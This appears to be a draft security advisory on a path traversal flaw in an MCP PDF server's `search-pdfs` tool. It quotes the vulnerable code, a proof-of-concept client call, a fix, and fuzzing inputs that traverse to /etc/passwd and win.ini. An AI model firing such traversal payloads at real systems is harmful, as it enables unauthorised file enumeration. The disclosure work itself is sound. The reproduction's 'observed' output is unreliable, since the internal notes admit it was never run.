# Path traversal in `search-pdfs`: `base_path` lists PDF files in any directory

**Repository:** `hanweg/mcp-pdf-tools` · **Tool:** `search-pdfs` · **Tested commit:** `388ba1f`
**Weakness:** CWE-22 Path Traversal

## Summary
`search-pdfs` lists PDF files under `base_path` whose names match `pattern`. `base_path` is only normalized with `os.path.normpath()`, which keeps leading `..` segments and absolute paths, and is then passed to `os.walk()` or `os.listdir()`. A caller can enumerate PDF file names anywhere the server process can read. The server has no configured base directory, so there is no boundary to the folders the user meant to share.

## Details
`src/pdf_tools/server.py:222-256` at `388ba1f`:

```python
        base_path = arguments.get("base_path")
        pattern = arguments.get("pattern", "*.pdf")
        recursive = arguments.get("recursive", True)
        ...
        # Normalize the base path to handle Windows paths
        base_path = os.path.normpath(base_path)
        found_files = []
        try:
            if recursive:
                for root, _, files in os.walk(base_path):
                    ...
            else:
                for file in os.listdir(base_path):
                    ...
                            full_path = os.path.join(base_path, file)
                            found_files.append(full_path)
```

`os.path.normpath("..")` is `..` and `os.path.normpath("/some/dir")` is unchanged, so normalization is not a containment check. There is no `realpath` plus prefix check and no allow-list. The reply lists full paths of every match. On error, the reply also echoes `base_path` back (`server.py:261`).

The other tools in this server (`extract-pages`, `merge-pdfs`, `merge-pdfs-ordered`, `find-related-pdfs`) take paths the same way.

## Steps to reproduce
1. Prerequisites: Python 3.10+ and `uv`. No accounts or env vars. Create a marker file and an empty working folder first. The tool only looks at names, so a text file with a `.pdf` name is enough:

   ```bash
   mkdir -p /tmp/tofu-poc/root && echo marker > /tmp/tofu-poc/outside.pdf
   ```
2. Install as the README describes (Linux/macOS form):

   ```bash
   git clone https://github.com/hanweg/mcp-pdf-tools.git
   cd mcp-pdf-tools && git checkout 388ba1f
   uv venv && uv pip install -e .
   ```
3. Start the server with `/tmp/tofu-poc/root` as its working directory and call the tool with:

   ```json
   {"base_path": "..", "pattern": "outside", "recursive": false}
   ```

   ```python
   import asyncio
   from mcp import ClientSession, StdioServerParameters
   from mcp.client.stdio import stdio_client

   async def main():
       server = StdioServerParameters(
           command="/path/to/mcp-pdf-tools/.venv/bin/pdf-tools",
           args=[],
           cwd="/tmp/tofu-poc/root",
       )
       async with stdio_client(server) as (read, write):
           async with ClientSession(read, write) as session:
               await session.initialize()
               result = await session.call_tool("search-pdfs", {
                   "base_path": "..",
                   "pattern": "outside",
                   "recursive": False,
               })
               print(result)

   asyncio.run(main())
   ```
4. Observe: the reply is `Found 1 PDF files:\n- ../outside.pdf`, a file outside `/tmp/tofu-poc/root`.

## Expected behavior
`base_path` is limited to directories the user configured. `..`, or any path that resolves outside them, is rejected before the tool lists anything.

## Actual behavior
The tool lists `../outside.pdf`. During fuzzing, traversal-shaped `base_path` values were accepted without any validation error:

```
input:  {"base_path": "../../../../etc/passwd", "pattern": "*.pdf", "recursive": true}
output: Found 0 PDF files:
```

(That value names a regular file, so `os.walk` returned nothing; the point is that no check rejected it.)

## Impact
In MCP the LLM chooses `base_path`, and prompt injection from untrusted content can steer it. An attacker can enumerate the names and locations of PDF files anywhere the server user can read, for example to find documents to target with the other tools in this server. The tool itself does not read file contents or write anything, so on its own the impact is low.

## Suggested fix
- Add an allow-list of directories (command-line arguments or an env var such as `PDF_TOOLS_ALLOWED_DIRS`).
- Resolve `base_path` with `os.path.realpath()` and reject it unless it equals an allowed root or starts with `root + os.sep`. Use the same helper in the other four tools.

## Status on the default branch
Still present at `388ba1f` (2024-12-22). The default branch head is the tested commit.

## Prior reports
- #2 "Add MseeP.ai badge to README" (PR, open 2025-04-28): related only. A third-party badge PR whose body pastes an automated semgrep result, "Potentially unsafe file access", for `server.py` lines 164 and 168 (the `merge-pdfs` handler) "and 3 more medium severity issues" at unnamed locations. It does not name this tool, it is not a bug report, and nothing was changed.
- Documentation: README.md: "WORK IN PROGRESS - USE WITH CAUTION - Windows:" (a general caution only; the README does not say which paths the tools may touch, and there is no allowed-directory setting).

<details>
<summary>Internal notes (remove before filing)</summary>

- ToFu class / sanitizers: path-traversal (CWE-22). Fired for this tool: `check_path_traversal` (input-pattern match only) and `check_reflected_output` (the error branch echoes `base_path`). No tracer-based file alert fired.
- Campaigns and executions: corpus-sbx 2048 exec / 2013 ok (60 s); e2-0922 1024 exec / 991 ok (60 s).
- Evidence (verbatim, trimmed):
  - `{'base_path': '/etc/passwd\x00', 'pattern': '*', 'recursive': True}` -> `'Error searching for PDFs: scandir: embedded null character in path\nBase path: /etc/passwd\x00'`
  - `{'base_path': '../../../../etc/passwd', 'pattern': '*.pdf', 'recursive': True}` -> `'Found 0 PDF files:\n'`
  - `{'base_path': '..\\..\\..\\..\\windows\\win.ini', 'pattern': 'report*.pdf', 'recursive': False}` -> `"Error searching for PDFs: [Errno 2] No such file or directory: ..."`
- Hand-check hints: weak. The missing restriction on `base_path` is real in code (`server.py:230-250`), but the impact is name enumeration only, and none of the logged calls listed anything outside the target directory (alert is input-pattern only). The reproduction above was derived from code reading and was not executed. Side note: `pattern` is used as a substring after stripping `.pdf`, so the schema's own example `report*.pdf` never matches (functional bug, not security). Best filed as part of one combined issue for all five tools rather than alone.
</details>
